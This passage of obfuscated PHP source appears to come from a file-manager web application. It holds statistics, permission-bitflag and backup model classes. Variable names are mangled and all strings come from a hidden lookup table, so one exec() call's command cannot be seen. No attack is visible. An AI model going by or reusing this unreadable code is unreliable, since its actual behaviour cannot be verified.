$Ç©¯‹†Ñ[1904] => (int) $™šş›”•); return $this->insert($ßı½öĞ); } public function trend($‹¸áºª, $†Åş…è) { $•ÈôÕ =& $_SERVER[¢ñàß¿€]; if (!$this->init($‹¸áºª)) { return !1; } $ÛÎêö§¶ = $this->trendList($‹¸áºª); if ($ÛÎêö§¶ && $†Åş…è != $•ÈôÕ[1743]) { $à¥ïì  = $ÛÎêö§¶[0][$•ÈôÕ[255]]; $ê¶ ¼¬Ü = $this->validDate($†Åş…è, $à¥ïì ); $¿´É—² = array(); $¯á’ÆÔ = array_to_keyvalue($ÛÎêö§¶, $•ÈôÕ[255]); foreach ($ê¶ ¼¬Ü as $È‚†î²) { if (isset($¯á’ÆÔ[$È‚†î²])) { $ÕÉÆ‘Æí = $¯á’ÆÔ[$È‚†î²]; } else { $ÕÉÆ‘Æí = end($ÛÎêö§¶); $ÕÉÆ‘Æí[$•ÈôÕ[255]] = $È‚†î²; if ($‹¸áºª == $•ÈôÕ[662]) { $ÕÉÆ‘Æí[$•ÈôÕ[1898]] = $ÕÉÆ‘Æí[$•ÈôÕ[1899]] = 0; } } $¿´É—²[] = $ÕÉÆ‘Æí; } $ÛÎêö§¶ = $¿´É—²; } $¤©£¬¤ì = array($•ÈôÕ[662] => array($•ÈôÕ[836] => LNG($•ÈôÕ[1914]), $•ÈôÕ[1898] => LNG($•ÈôÕ[1915]), $•ÈôÕ[1899] => LNG($•ÈôÕ[1916])), $•ÈôÕ[1900] => array($•ÈôÕ[834] => LNG($•ÈôÕ[1917]), $•ÈôÕ[1902] => LNG($•ÈôÕ[1918]), $•ÈôÕ[1903] => LNG($•ÈôÕ[1919]), $•ÈôÕ[1904] => LNG($•ÈôÕ[1920]))); $Õ¤Ú´ëø = array($•ÈôÕ[662] => $•ÈôÕ[1921], $•ÈôÕ[1900] => $•ÈôÕ[79]); if (empty($ÛÎêö§¶)) { $È‚†î² = date($•ÈôÕ[1905], strtotime($•ÈôÕ[1906])); $Ú°ë•µƒ = array($•ÈôÕ[255] => $È‚†î²); foreach ($¤©£¬¤ì[$‹¸áºª] as $§Í€È => $ ûıÎ¡ƒ) { $Ú°ë•µƒ[$§Í€È] = 0; } $ÛÎêö§¶[] = $Ú°ë•µƒ; } $×àé‚Ä = array(); foreach ($ÛÎêö§¶ as $ ûıÎ¡ƒ) { if ($‹¸áºª == $•ÈôÕ[1900] && $ ûıÎ¡ƒ[$•ÈôÕ[1902]] > $ ûıÎ¡ƒ[$•ÈôÕ[834]]) { $ ûıÎ¡ƒ[$•ÈôÕ[1902]] = $ ûıÎ¡ƒ[$•ÈôÕ[834]]; } foreach ($¤©£¬¤ì[$‹¸áºª] as $§Í€È => $¯ŞüÎœÍ) { $ÕÉÆ‘Æí = array($•ÈôÕ[255] => $ ûıÎ¡ƒ[$•ÈôÕ[255]], $•ÈôÕ[1659] => $¯ŞüÎœÍ); $ÕÉÆ‘Æí[$Õ¤Ú´ëø[$‹¸áºª]] = isset($ ûıÎ¡ƒ[$§Í€È]) ? $ ûıÎ¡ƒ[$§Í€È] : 0; $×àé‚Ä[] = $ÕÉÆ‘Æí; } } return $×àé‚Ä; } public function validDate($¯·ÎĞô˜, $şúÌ¯—) { $æşÇºêÁ =& $_SERVER[¢ñàß¿€]; $Ë·üùí¨ = date($æşÇºêÁ[1905], strtotime($æşÇºêÁ[1906])); $¨¹£ÊŸ = array($Ë·üùí¨); switch ($¯·ÎĞô˜) { case $æşÇºêÁ[1750]: $Êú É˜ = mktime(0, 0, 0, date($æşÇºêÁ[1922]), date($æşÇºêÁ[1446]) - date($æşÇºêÁ[1538]) + 7 - 7, date($æşÇºêÁ[1923])); $‡˜Í¢î = 0; do { $¤ú…—Ü› = date($æşÇºêÁ[1905], $Êú É˜ - 3600 * 24 * 7 * $‡˜Í¢î); $¨¹£ÊŸ[] = $¤ú…—Ü›; $‡˜Í¢î++; } while ($şúÌ¯— < $¤ú…—Ü›); break; case $æşÇºêÁ[1748]: $‡˜Í¢î = 1; do { $ºËÄÊÜ = date($æşÇºêÁ[1924], strtotime("\x2d\40{$‡˜Í¢î}\40\155\x6f\156\164\150\x73")); $¨¹£ÊŸ[] = $ºËÄÊÜ; $‡˜Í¢î++; } while ($şúÌ¯— < $ºËÄÊÜ); break; case $æşÇºêÁ[1925]: $ã¿›„õû = (int) date($æşÇºêÁ[1923], strtotime($şúÌ¯—)); $ŠÕ”àñ = (int) date($æşÇºêÁ[1923]); if ($ã¿›„õû >= $ŠÕ”àñ) { break; } for ($ã¿›„õû; $ã¿›„õû < $ŠÕ”àñ; $ã¿›„õû++) { $¨¹£ÊŸ[] = $ã¿›„õû . $æşÇºêÁ[1926]; } break; default: break; } if ($şúÌ¯— > end($¨¹£ÊŸ)) { array_pop($¨¹£ÊŸ); } sort($¨¹£ÊŸ); return $¨¹£ÊŸ; } public function listTable($§Ì§Ú‡¥) { $ò³î§­´ = ucfirst($§Ì§Ú‡¥); return Model($ò³î§­´)->listData(); } public function option($Â¼ğ€ãÂ) { $ú´ÀıÙ = $_SERVER[¢ñàß¿€][1927] . ucfirst($Â¼ğ€ãÂ); return $this->{$ú´ÀıÙ}(); } private function optionUser() { $ã±şÛó‹ =& $_SERVER[¢ñàß¿€]; $§ù¶ó¶§ = Model($ã±şÛó‹[598])->count($ã±şÛó‹[1770]); $ÂÍé—¸ = Model($ã±şÛó‹[598])->where($ã±şÛó‹[1928])->count($ã±şÛó‹[1770]); $Ã˜şÔÇ¯ = intval($GLOBALS[$ã±şÛó‹[6]][$ã±şÛó‹[425]][$ã±şÛó‹[1716]]) / 3600; $¥‘Ìˆ® = strtotime("\55{$Ã˜şÔÇ¯}\x20\x68\x6f\x75\162\x73"); $€šÖ¬ş = strtotime(date($ã±şÛó‹[1909])); if ($¥‘Ìˆ® < $€šÖ¬ş) { $¥‘Ìˆ® = $€šÖ¬ş; } $»®âÇğğ = array($ã±şÛó‹[1929] => array($ã±şÛó‹[1089], $¥‘Ìˆ®)); $”í¢ğ®Ğ = (int) Model($ã±şÛó‹[598])->where($»®âÇğğ)->count($ã±şÛó‹[1770]); if (!$”í¢ğ®Ğ) { $”í¢ğ®Ğ = 1; } $»®âÇğğ = array($ã±şÛó‹[1929] => array($ã±şÛó‹[1089], $€šÖ¬ş)); $„æÓß¦Â = Model($ã±şÛó‹[598])->where($»®âÇğğ)->count($ã±şÛó‹[1770]); return array($ã±şÛó‹[829] => (int) $§ù¶ó¶§, $ã±şÛó‹[1930] => (int) ($§ù¶ó¶§ - $ÂÍé—¸), $ã±şÛó‹[1931] => (int) $ÂÍé—¸, $ã±şÛó‹[1932] => (int) $„æÓß¦Â, $ã±şÛó‹[1933] => $”í¢ğ®Ğ); } private function optionFile() { $Ãâ²ıÎù =& $_SERVER[¢ñàß¿€]; $ÑàØ™ŒÄ = $this->sourceSize(); $‡Òç®¿Û = $ÑàØ™ŒÄ[$Ãâ²ıÎù[79]]; $ğ­õ‰³¼ = $ÑàØ™ŒÄ[$Ãâ²ıÎù[1902]]; $Êéà¨”ç = Model($Ãâ²ıÎù[895])->where(array($Ãâ²ıÎù[485] => 0))->count($Ãâ²ıÎù[193]); $Èã¹ÒâÊ = array($Ãâ²ıÎù[485] => 0, $Ãâ²ıÎù[231] => array($Ãâ²ıÎù[1089], strtotime(date($Ãâ²ıÎù[1909])))); $÷ö­ô¬ù = Model($Ãâ²ıÎù[895])->where($Èã¹ÒâÊ)->sum($Ãâ²ıÎù[79]); $áÈğ¥Õ• = Model($Ãâ²ıÎù[895])->where($Èã¹ÒâÊ)->count($Ãâ²ıÎù[193]); return array($Ãâ²ıÎù[834] => $‡Òç®¿Û, $Ãâ²ıÎù[1902] => $ğ­õ‰³¼, $Ãâ²ıÎù[1934] => $‡Òç®¿Û - $ğ­õ‰³¼, $Ãâ²ıÎù[1935] => (int) $÷ö­ô¬ù, $Ãâ²ıÎù[836] => (int) $Êéà¨”ç, $Ãâ²ıÎù[1936] => (int) $áÈğ¥Õ•); } private function optionAccess() { $†Ü–ÔÔ£ =& $_SERVER[¢ñàß¿€]; return array($†Ü–ÔÔ£[829] => $this->typeLogCnt(), $†Ü–ÔÔ£[110] => $this->typeLogCnt($†Ü–ÔÔ£[110]), $†Ü–ÔÔ£[525] => $this->typeLogCnt($†Ü–ÔÔ£[525]), $†Ü–ÔÔ£[1937] => $this->typeLogCnt($†Ü–ÔÔ£[1937]), $†Ü–ÔÔ£[1938] => $this->typeLogCnt($†Ü–ÔÔ£[1938]), $†Ü–ÔÔ£[662] => $this->typeLogCnt($†Ü–ÔÔ£[12], $†Ü–ÔÔ£[1913])); } private function typeLogCnt($¥ÜÅ¾àå = '', $åœçâøö = "\x69\144") { $×Ç§¥ø =& $_SERVER[¢ñàß¿€]; $ëÈßÆ¥ = array($×Ç§¥ø[110] => array($×Ç§¥ø[1939], $×Ç§¥ø[1940]), $×Ç§¥ø[525] => array($×Ç§¥ø[1941], $×Ç§¥ø[1942]), $×Ç§¥ø[1937] => array($×Ç§¥ø[1943], $×Ç§¥ø[1944], $×Ç§¥ø[1945]), $×Ç§¥ø[1938] => array($×Ç§¥ø[1946], $×Ç§¥ø[1947]), $×Ç§¥ø[1948] => array($×Ç§¥ø[1949], $×Ç§¥ø[1950], $×Ç§¥ø[1951])); $Ô’Á®Î‹ = strtotime(date($×Ç§¥ø[1909])); $¦ø¬…ºÎ = array($×Ç§¥ø[231] => array($×Ç§¥ø[1089], $Ô’Á®Î‹)); if ($¥ÜÅ¾àå) { $¦ø¬…ºÎ[$×Ç§¥ø[33]] = array($×Ç§¥ø[7], $ëÈßÆ¥[$¥ÜÅ¾àå]); } $¢õÂ½ò½ = Model($×Ç§¥ø[1912])->where($¦ø¬…ºÎ)->count($åœçâøö); return (int) $¢õÂ½ò½; } private function optionServer() { $’£€Ê =& $_SERVER[¢ñàß¿€]; $•˜Àà·· = $this->diskDriver(); $¡ïÅÌ— = KodIO::defaultDriver(); $È×Íç¥ = array($’£€Ê[888] => $¡ïÅÌ—[$’£€Ê[475]]); $ø³Âß™Å = Model($’£€Ê[544])->where($È×Íç¥)->sum($’£€Ê[79]); $Éµ¢¸öÍ = explode($’£€Ê[53], $_SERVER[$’£€Ê[147]]); $¤¬—‡Ô = $Éµ¢¸öÍ[0]; $©òú’ñ• = $GLOBALS[$’£€Ê[6]][$’£€Ê[21]]; $ôƒçê¬ = $©òú’ñ•[$’£€Ê[1051]]; if ($ôƒçê¬ == $’£€Ê[1039]) { $œèş¸¨ü = explode($’£€Ê[1365], $©òú’ñ•[$’£€Ê[1050]]); $ôƒçê¬ = $œèş¸¨ü[0]; } if ($ôƒçê¬ == $’£€Ê[987] || $ôƒçê¬ == $’£€Ê[875]) { $Á­¨¨õ = Model()->db()->query($’£€Ê[1952]); $­Œ µ±¡ = $Á­¨¨õ[0] && isset($Á­¨¨õ[0][$’£€Ê[1658]]) ? $Á­¨¨õ[0][$’£€Ê[1658]] : 0; $ôƒçê¬ = $’£€Ê[1953] . ($­Œ µ±¡ ? $’£€Ê[8] . $­Œ µ±¡ : $’£€Ê[12]); } $Ñğ¬ŒµÀ = $GLOBALS[$’£€Ê[6]][$’£€Ê[425]][$’£€Ê[897]]; return array($’£€Ê[1954] => $•˜Àà·· ? $•˜Àà··[$’£€Ê[1955]] : 0, $’£€Ê[1956] => $•˜Àà·· ? $•˜Àà··[$’£€Ê[1957]] : 0, $’£€Ê[1958] => (int) $¡ïÅÌ—[$’£€Ê[1955]] * 1024 * 1024 * 1024, $’£€Ê[1959] => (int) $ø³Âß™Å, $’£€Ê[1960] => ucfirst($¤¬—‡Ô), $’£€Ê[1961] => $’£€Ê[1962] . PHP_VERSION, $’£€Ê[1963] => phpBuild64() ? 64 : 32, $’£€Ê[828] => str_replace($’£€Ê[1208], $’£€Ê[1067], $ôƒçê¬), $’£€Ê[425] => ucfirst($Ñğ¬ŒµÀ), $’£€Ê[32] => $_SERVER[$’£€Ê[1964]]); } private function diskDriver() { $´°—’Ì =& $_SERVER[¢ñàß¿€]; $ç¸ü”ÖÎ = $´°—’Ì[8]; $§”©«ÔÊ = $GLOBALS[$´°—’Ì[6]][$´°—’Ì[1382]] == $´°—’Ì[1383]; if ($§”©«ÔÊ) { $ç¸ü”ÖÎ = $´°—’Ì[1965]; if (function_exists($´°—’Ì[1966])) { exec($´°—’Ì[1967], $ÁØñÚÆÄ); $ç¸ü”ÖÎ = $ÁØñÚÆÄ[1] . $´°—’Ì[8]; } } if (!file_exists($ç¸ü”ÖÎ)) { return; } $¤¦íƒÂ‰ = @disk_total_space($ç¸ü”ÖÎ); $Ş³Ïí­– = $¤¦íƒÂ‰ - @disk_free_space($ç¸ü”ÖÎ); return array($´°—’Ì[1955] => $¤¦íƒÂ‰, $´°—’Ì[1957] => $Ş³Ïí­–); } public function fileChart($ùÀ‹ˆŒÇ) { $ƒ³ŠßŸÅ =& $_SERVER[¢ñàß¿€]; if (isset($ùÀ‹ˆŒÇ[$ƒ³ŠßŸÅ[1770]])) { return Model($ƒ³ŠßŸÅ[895])->userFileTypeProfile($ùÀ‹ˆŒÇ[$ƒ³ŠßŸÅ[1770]]); } if (isset($ùÀ‹ˆŒÇ[$ƒ³ŠßŸÅ[1968]])) { return Model($ƒ³ŠßŸÅ[895])->groupFileTypeProfile($ùÀ‹ˆŒÇ[$ƒ³ŠßŸÅ[1968]]); } $é¸ÉÓ¦ı = $this->sourceSize(); $óÁ‘ íÁ = array($ƒ³ŠßŸÅ[192] => 0, $ƒ³ŠßŸÅ[190] => 1); $¸°Äâ…’ = Model($ƒ³ŠßŸÅ[895])->where($óÁ‘ íÁ)->sum($ƒ³ŠßŸÅ[79]); $óÁ‘ íÁ[$ƒ³ŠßŸÅ[190]] = 2; $ùäµ–§ç = Model($ƒ³ŠßŸÅ[895])->where($óÁ‘ íÁ)->sum($ƒ³ŠßŸÅ[79]); return array($ƒ³ŠßŸÅ[834] => $é¸ÉÓ¦ı[$ƒ³ŠßŸÅ[79]], $ƒ³ŠßŸÅ[1902] => $é¸ÉÓ¦ı[$ƒ³ŠßŸÅ[1902]], $ƒ³ŠßŸÅ[1903] => (int) $¸°Äâ…’, $ƒ³ŠßŸÅ[1904] => (int) $ùäµ–§ç); } private function sourceSize() { $¦Úçáİ =& $_SERVER[¢ñàß¿€]; $øŞá˜ëâ = Model($¦Úçáİ[895])->where(array($¦Úçáİ[485] => 0))->sum($¦Úçáİ[79]); $­ ¿©ğØ = Model($¦Úçáİ[544])->sum($¦Úçáİ[79]); if ($­ ¿©ğØ > $øŞá˜ëâ) { $­ ¿©ğØ = $øŞá˜ëâ; } return array($¦Úçáİ[79] => (int) $øŞá˜ëâ, $¦Úçáİ[1902] => (int) $­ ¿©ğØ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $õÎ‘ØÑæ =& $_SERVER[¢ñàß¿€]; $Éß‰‹àŞ = array(array($õÎ‘ØÑæ[494] => LNG($õÎ‘ØÑæ[1969]), $õÎ‘ØÑæ[1970] => $õÎ‘ØÑæ[1971], $õÎ‘ØÑæ[1972] => 1, $õÎ‘ØÑæ[1973] => 1, $õÎ‘ØÑæ[1974] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($õÎ‘ØÑæ[494] => LNG($õÎ‘ØÑæ[1975]), $õÎ‘ØÑæ[1970] => $õÎ‘ØÑæ[1976], $õÎ‘ØÑæ[1972] => 2, $õÎ‘ØÑæ[1973] => 1, $õÎ‘ØÑæ[1974] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($õÎ‘ØÑæ[494] => LNG($õÎ‘ØÑæ[1977]), $õÎ‘ØÑæ[1970] => $õÎ‘ØÑæ[1978], $õÎ‘ØÑæ[1972] => 3, $õÎ‘ØÑæ[1973] => 1, $õÎ‘ØÑæ[1974] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($õÎ‘ØÑæ[494] => LNG($õÎ‘ØÑæ[1979]), $õÎ‘ØÑæ[1970] => $õÎ‘ØÑæ[1980], $õÎ‘ØÑæ[1972] => 4, $õÎ‘ØÑæ[1973] => 1, $õÎ‘ØÑæ[1974] => self::AUTH_SHOW | self::AUTH_VIEW), array($õÎ‘ØÑæ[494] => LNG($õÎ‘ØÑæ[1981]), $õÎ‘ØÑæ[1970] => $õÎ‘ØÑæ[1982], $õÎ‘ØÑæ[1972] => 5, $õÎ‘ØÑæ[1973] => 1, $õÎ‘ØÑæ[1974] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($õÎ‘ØÑæ[494] => LNG($õÎ‘ØÑæ[1983]), $õÎ‘ØÑæ[1970] => $õÎ‘ØÑæ[1984], $õÎ‘ØÑæ[1972] => 6, $õÎ‘ØÑæ[1973] => 1, $õÎ‘ØÑæ[1974] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($õÎ‘ØÑæ[494] => LNG($õÎ‘ØÑæ[1985]), $õÎ‘ØÑæ[1970] => $õÎ‘ØÑæ[1986], $õÎ‘ØÑæ[1972] => 7, $õÎ‘ØÑæ[1973] => 1, $õÎ‘ØÑæ[1974] => 0)); return $Éß‰‹àŞ; } public static function authCheck($Î¶ƒÚå, $Ç¹ÖèÃ) { $‘¸²ûâ« =& $_SERVER[¢ñàß¿€]; $Î¶ƒÚå = intval($Î¶ƒÚå); if (KodUser::isRoot() && $GLOBALS[$‘¸²ûâ«[6]][$‘¸²ûâ«[1987]]) { return !0; } if ($Î¶ƒÚå <= 0) { return !1; } if (($Î¶ƒÚå & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Î¶ƒÚå & $Ç¹ÖèÃ); } public static function authCheckShow($§‘öÒ¤Ü) { return self::authCheck($§‘öÒ¤Ü, self::AUTH_SHOW); } public static function authCheckView($ŒÈÛçî) { return self::authCheck($ŒÈÛçî, self::AUTH_VIEW); } public static function authCheckDownload($ÂÑ¹™°) { return self::authCheck($ÂÑ¹™°, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ÔÍ¹çËÑ) { return self::authCheck($ÔÍ¹çËÑ, self::AUTH_UPLOAD); } public static function authCheckEdit($Õ„Õ«îÄ) { return self::authCheck($Õ„Õ«îÄ, self::AUTH_EDIT); } public static function authCheckRemove($ú™Ü¦ó”) { return self::authCheck($ú™Ü¦ó”, self::AUTH_REMOVE); } public static function authCheckShare($¶ûÃ±Ë) { return self::authCheck($¶ûÃ±Ë, self::AUTH_SHARE); } public static function authCheckComment($Æ—«Êì) { return self::authCheck($Æ—«Êì, self::AUTH_COMMENT); } public static function authCheckEvent($ƒÔíÅëË) { return self::authCheck($ƒÔíÅëË, self::AUTH_EVENT); } public static function authCheckRoot($”“¶¼¥«) { return self::authCheck($”“¶¼¥«, self::AUTH_ROOT); } public static function authCheckAction($µéáî·ø, $÷š¥éëµ) { $³Î«³Œ÷ =& $_SERVER[¢ñàß¿€]; $¸ğÌïÛ = array($³Î«³Œ÷[1988] => self::AUTH_VIEW, $³Î«³Œ÷[1276] => self::AUTH_DOWNLOAD, $³Î«³Œ÷[110] => self::AUTH_UPLOAD, $³Î«³Œ÷[1938] => self::AUTH_EDIT, $³Î«³Œ÷[1937] => self::AUTH_REMOVE, $³Î«³Œ÷[1948] => self::AUTH_SHARE, $³Î«³Œ÷[430] => self::AUTH_COMMENT, $³Î«³Œ÷[1758] => self::AUTH_EVENT, $³Î«³Œ÷[1989] => self::AUTH_ROOT); if (!isset($¸ğÌïÛ[$÷š¥éëµ])) { return; } $ê™ö¦àú = $¸ğÌïÛ[$÷š¥éëµ]; $µéáî·ø = intval($µéáî·ø); if ($µéáî·ø <= 0) { return !1; } if (($µéáî·ø & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($µéáî·ø & $ê™ö¦àú); } public static function authDisable($ÙßŠêÍ, $Ş¿òåğ ) { if (intval($ÙßŠêÍ) <= 0) { return 0; } return intval($ÙßŠêÍ) & ~$Ş¿òåğ ; } public $optionType = "\123\x79\163\164\x65\x6d\56\163\x6f\x75\162\143\x65\101\165\164\x68\x4c\x69\163\164"; public $field = array("\156\141\155\145", "\x61\x75\x74\150", "\x6c\x61\x62\145\154", "\x64\x69\163\160\154\141\x79", "\x73\x79\x73\164\145\155", "\x73\x6f\x72\164"); public function initData() { $–àªáò’ = $this->authDefault(); foreach ($–àªáò’ as $Ä°Üİ¦Å) { $this->add($Ä°Üİ¦Å); } } public function findAuth($¥ÌÉÔ„, $ô½ ·ë) { $İò©‹­ı =& $_SERVER[¢ñàß¿€]; $şŸğë“ = parent::listData(); foreach ($şŸğë“ as $¤ŸæüÖõ) { $Ã°ñ‘ŞÅ = intval($¤ŸæüÖõ[$İò©‹­ı[487]]); if ($Ã°ñ‘ŞÅ <= 0 || $¤ŸæüÖõ[$İò©‹­ı[1990]] == 0) { continue; } if (($Ã°ñ‘ŞÅ & $¥ÌÉÔ„) != $¥ÌÉÔ„) { continue; } if (($Ã°ñ‘ŞÅ & $ô½ ·ë) != 0) { continue; } return $¤ŸæüÖõ[$İò©‹­ı[475]]; } return !1; } public function findAuthReadOnly() { $¿¤ŞèÈò = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $°šáÜ½ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¿¤ŞèÈò, $°šáÜ½); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $³´¾¾ãÅ =& $_SERVER[¢ñàß¿€]; $‘»Éá·á = parent::listData(); $òıíß™Ö = !1; foreach ($‘»Éá·á as $Õº¬ñä) { if ($Õº¬ñä[$³´¾¾ãÅ[487]] <= 0 || $Õº¬ñä[$³´¾¾ãÅ[1990]] == $³´¾¾ãÅ[228]) { continue; } if (!$òıíß™Ö) { $òıíß™Ö = $Õº¬ñä; continue; } if ($òıíß™Ö[$³´¾¾ãÅ[487]] > $Õº¬ñä[$³´¾¾ãÅ[487]]) { $òıíß™Ö = $Õº¬ñä; } } return $òıíß™Ö ? $òıíß™Ö[$³´¾¾ãÅ[475]] : $³´¾¾ãÅ[12]; } public function listData($ı÷™‘îô = false, $¢äêşÈÁ = "\163\x6f\x72\164", $´³–» = false) { return parent::listData($ı÷™‘îô, $¢äêşÈÁ, $´³–»); } public function update($¨¼ôÀŠã, $Úé©Ìóñ) { $ÉÎÙ×¿ =& $_SERVER[¢ñàß¿€]; $ÂÒµ‚Ü¥ = parent::listData($¨¼ôÀŠã); $ºØ¤¡©é = $this->findByName($Úé©Ìóñ[$ÉÎÙ×¿[32]]); if (!$ÂÒµ‚Ü¥ || $ºØ¤¡©é && $ºØ¤¡©é[$ÉÎÙ×¿[475]] != $ÂÒµ‚Ü¥[$ÉÎÙ×¿[475]]) { return !1; } $this->filterAuth($Úé©Ìóñ[$ÉÎÙ×¿[487]]); return parent::update($¨¼ôÀŠã, $Úé©Ìóñ); } public function remove($“Äü—êØ) { $©Û³öìª = parent::listData($“Äü—êØ); if (!$©Û³öìª || $©Û³öìª[$_SERVER[¢ñàß¿€][191]]) { return !1; } return parent::remove($“Äü—êØ); } public function add($úŠò¤å¶ = array()) { $Áğ¸™üÕ =& $_SERVER[¢ñàß¿€]; if ($this->findByName($úŠò¤å¶[$Áğ¸™üÕ[32]])) { return !1; } $Ô¸ŞÍ´¤ = array($Áğ¸™üÕ[32] => $Áğ¸™üÕ[12], $Áğ¸™üÕ[487] => 1, $Áğ¸™üÕ[1991] => $Áğ¸™üÕ[1978], $Áğ¸™üÕ[1990] => 1, $Áğ¸™üÕ[191] => 0, $Áğ¸™üÕ[1992] => 0); $úŠò¤å¶ = array_merge($Ô¸ŞÍ´¤, $úŠò¤å¶); $úŠò¤å¶[$Áğ¸™üÕ[1992]] = $this->getSort(); $this->filterAuth($úŠò¤å¶[$Áğ¸™üÕ[487]]); return parent::insert($úŠò¤å¶); } private function getSort() { $¨ûÖÛºâ =& $_SERVER[¢ñàß¿€]; $Ÿ¶Àº = parent::listData(); $¥§‹ìö = array_to_keyvalue($Ÿ¶Àº, $¨ûÖÛºâ[12], $¨ûÖÛºâ[1992]); return empty($¥§‹ìö) ? 0 : max($¥§‹ìö) + 1; } private function filterAuth(&$Ò‹Ä¢®Ò) { if (!$Ò‹Ä¢®Ò) { return; } $„¦ÁŸ¯Ô = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ı‚³Ûª = array(); foreach ($„¦ÁŸ¯Ô as $à¢ú±) { if ($Ò‹Ä¢®Ò & $à¢ú±) { $ı‚³Ûª[] = $à¢ú±; } } if (in_array(self::AUTH_ROOT, $ı‚³Ûª)) { $Ò‹Ä¢®Ò = array_sum($„¦ÁŸ¯Ô); return; } $Õ¹üº«ş = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ı‚³Ûª as $à¢ú±) { if (isset($Õ¹üº«ş[$à¢ú±])) { $ı‚³Ûª = array_merge($ı‚³Ûª, $Õ¹üº«ş[$à¢ú±]); } } $ı‚³Ûª[] = self::AUTH_SHOW; $Ò‹Ä¢®Ò = array_sum(array_unique($ı‚³Ûª)); } public function sort($àñÚ¹¨Ã, $ª¯¦ùç–) { return parent::update($àñÚ¹¨Ã, $ª¯¦ùç–); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\142\x61\x63\x6b\165\x70\114\x69\x73\x74"; public $field = array("\151\157", "\x6e\x61\155\145", "\x73\164\141\164\x75\163", "\143\157\156\x74\x65\x6e\164", "\x6d\x61\x6e\165\141\x6c", "\162\145\163\165\x6c\x74", "\164\x69\155\145\106\162\157\x6d", "\x74\151\155\145\x54\x6f"); public function config() { $…´Ñ¾•Ú =& $_SERVER[¢ñàß¿€]; Action($…´Ñ¾•Ú[1993])->taskInit(); $Ã’†åÌ¥ = Model($…´Ñ¾•Ú[841])->get($…´Ñ¾•Ú[854]); $Ã’†åÌ¥ = json_decode($Ã’†åÌ¥, !0); $Ã’†åÌ¥ = is_array($Ã’†åÌ¥) ? $Ã’†åÌ¥ : array(); $this->parseContent($Ã’†åÌ¥); unset($Ã’†åÌ¥[$…´Ñ¾•Ú[1740]]); Model($…´Ñ¾•Ú[1739])->cacheClear(); $­Æ‰ª = $…´Ñ¾•Ú[1994]; $ã¢ò­®Å = Model($…´Ñ¾•Ú[1995])->findByKey($…´Ñ¾•Ú[1758], $­Æ‰ª); if (!$ã¢ò­®Å) { $ã¢ò­®Å = array(); } if (isset($ã¢ò­®Å[$…´Ñ¾•Ú[206]])) { $ã¢ò­®Å[$…´Ñ¾•Ú[206]] = json_decode($ã¢ò­®Å[$…´Ñ¾•Ú[206]], !0); } if (isset($Ã’†åÌ¥[$…´Ñ¾•Ú[206]])) { $ã¢ò­®Å[$…´Ñ¾•Ú[206]][$…´Ñ¾•Ú[1743]] = $Ã’†åÌ¥[$…´Ñ¾•Ú[206]]; unset($Ã’†åÌ¥[$…´Ñ¾•Ú[206]]); } return array_merge($ã¢ò­®Å, $Ã’†åÌ¥); } public function listData($İïˆÖÇ† = false, $æØ³œ·­ = "\x6d\157\144\151\146\171\124\x69\x6d\x65", $· Ôéáâ = false) { $‡á†»ö = parent::listData($İïˆÖÇ†, $æØ³œ·­, !0); if (!$‡á†»ö) { return $‡á†»ö; } if ($İïˆÖÇ†) { $‡á†»ö = array($‡á†»ö); } foreach ($‡á†»ö as &$çÄ«Œö) { $this->parseContent($çÄ«Œö); } return $İïˆÖÇ† ? $‡á†»ö[0] : $‡á†»ö; } public function parseContent(&$Õ³™¨‹û) { $Îî¸ë¿© =& $_SERVER[¢ñàß¿€]; $§šé¯º = _get($Õ³™¨‹û, $Îî¸ë¿©[171], $Îî¸ë¿©[91]); if (!in_array($§šé¯º, array($Îî¸ë¿©[847], $Îî¸ë¿©[1208]))) { $Õ³™¨‹û[$Îî¸ë¿©[171]] = $§šé¯º == $Îî¸ë¿©[91] ? $Îî¸ë¿©[1208] : $Îî¸ë¿©[847]; } } public function lastItem() { $ÑşÇêÇú = $this->listData(); return !empty($ÑşÇêÇú[0]) ? $ÑşÇêÇú[0] : null; } public function kill($Ş¥¬È‰) { $»×Ñï³® =& $_SERVER[¢ñàß¿€]; 